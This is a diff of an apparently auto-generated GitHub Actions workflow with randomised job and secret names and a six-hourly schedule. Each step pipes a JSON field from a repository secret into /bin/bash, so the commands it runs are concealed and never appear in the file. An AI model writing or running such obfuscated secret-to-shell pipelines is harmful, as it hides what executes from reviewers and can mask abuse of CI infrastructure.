@@ -1,8 +1,9 @@
 name: piqijing4567
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 0/6 * * *'
+    - cron: '52 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,19 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: piqijing4567
         env:
-          xwfw34: ${{ secrets.xwfw34 }}
+          u126: ${{ secrets.u126 }}
         run: |
-          echo $xwfw34 | jq -r .jdkp690 | /bin/bash
-          echo $tln3 | jq -r .qutjg85199 | /bin/bash
-          echo $besz6430 | jq -r .zr59398 | /bin/bash
-          echo $r4 | jq -r .xwt8 | /bin/bash
-          echo $hw8 | jq -r .f9967 | /bin/bash
-          echo $aqn621 | jq -r .nu3 | /bin/bash
-          echo $boi76 | jq -r .jbjv4723 | /bin/bash
-          echo $efb06215 | jq -r .zcjb961 | /bin/bash
-          echo $g1 | jq -r .wuuxa3844 | /bin/bash
-          echo $noe4956 | jq -r .bg37 | /bin/bash
-          echo $lnyjb85 | jq -r .nmmp41215 | /bin/bash
-          echo $x46 | jq -r .caxrd39 | /bin/bash
-          echo $t4 | jq -r .dwxm2 | /bin/bash
+          echo $u126 | jq -r .sc63484 | /bin/bash
+          echo $zcuk03502 | jq -r .mwa6487 | /bin/bash
+          echo $x551 | jq -r .f8564 | /bin/bash
+          echo $bcvmj1124 | jq -r .xfnmb4863 | /bin/bash
+          echo $yphq71965 | jq -r .yjo17617 | /bin/bash
+          echo $j72 | jq -r .prvf868 | /bin/bash
+          echo $tgne95 | jq -r .tbgeh0667 | /bin/bash
+          echo $c26166 | jq -r .g178 | /bin/bash
+          echo $qwu5667 | jq -r .kvhxk91700 | /bin/bash
+          echo $au1708 | jq -r .mlu7576 | /bin/bash
+          echo $x1529 | jq -r .f01 | /bin/bash
 
